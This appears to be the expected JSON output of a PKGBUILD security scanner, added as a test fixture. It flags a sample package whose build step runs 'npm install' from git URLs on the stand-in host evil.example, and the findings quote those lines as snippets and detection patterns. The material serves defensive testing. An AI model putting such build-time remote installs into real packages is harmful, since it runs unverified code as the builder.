@@ -1,0 +1,63 @@
+{
+  "package_name": "nodebuild",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "ATOMIC-006",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "npm/bun package installed from a URL or git remote during the build",
+      "description": "A PKGBUILD function installs a package straight from a URL, git remote or forge shorthand (`npm install git+https://...`, `github:user/repo`). Nothing pins or checksums that code, and it runs its lifecycle scripts as the builder.",
+      "location": {
+        "file": "tests/fixtures/malicious/npm-build-evasion/PKGBUILD",
+        "line": 12,
+        "column": 10,
+        "snippet": "    _out=$(npm install git+https://evil.example/x.git)"
+      },
+      "recommendation": "Do not build. Fetch the code through source= with a checksum.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "matched_text": "$(npm install git+https://"
+      }
+    },
+    {
+      "id": "ATOMIC-006",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "npm/bun package installed from a URL or git remote during the build",
+      "description": "A PKGBUILD function installs a package straight from a URL, git remote or forge shorthand (`npm install git+https://...`, `github:user/repo`). Nothing pins or checksums that code, and it runs its lifecycle scripts as the builder.",
+      "location": {
+        "file": "tests/fixtures/malicious/npm-build-evasion/PKGBUILD",
+        "line": 13,
+        "column": 1,
+        "snippet": "    ( /usr/bin/npm install -- git+https://evil.example/y.git )"
+      },
+      "recommendation": "Do not build. Fetch the code through source= with a checksum.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "matched_text": "    ( /usr/bin/npm install -- git+https://"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/npm-build-evasion/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/npm-build-evasion/PKGBUILD"
+  ],
+  "timestamp": "2026-11-10T14:51:03.633202642Z",
+  "scan_duration_ms": 19
+}
